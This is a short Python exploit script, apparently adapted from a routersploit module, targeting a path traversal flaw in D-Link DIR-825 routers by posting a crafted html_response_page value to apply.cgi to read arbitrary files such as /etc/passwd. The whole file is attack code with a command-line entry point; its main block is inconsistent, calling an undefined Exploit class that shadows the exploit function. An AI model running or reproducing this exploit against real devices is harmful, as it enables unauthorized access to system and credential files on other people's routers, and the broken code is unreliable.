target = ""
# rsf exploit module
# description: Module exploits D-Link DIR-825 path traversal vulnerability
import requests

def exploit(target, port, filename, username="admin", password=""):
    try:
        file_path = f"..{filename}"
        data = {
            "html_response_page": file_path,
            "action": "do_graph_auth",
            "login_name": "test",
            "login_pass": "test1",
            "&login_n": "test2",
            "log_pass": "test3",
            "graph_code": "63778",
            "session_id": "test5",
            "test": "test"
        }
        
        response = requests.post(
            f"http://{target}:{port}/apply.cgi",
            data=data,
            auth=(username, password),
            timeout=5
        )
        
        if response.status_code == 200:
            print(response.text)
            return True
        return False
    except:
        return False

def check(target, port=80, username="admin", password=""):
    return exploit(target, port, "/etc/passwd", username, password)



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
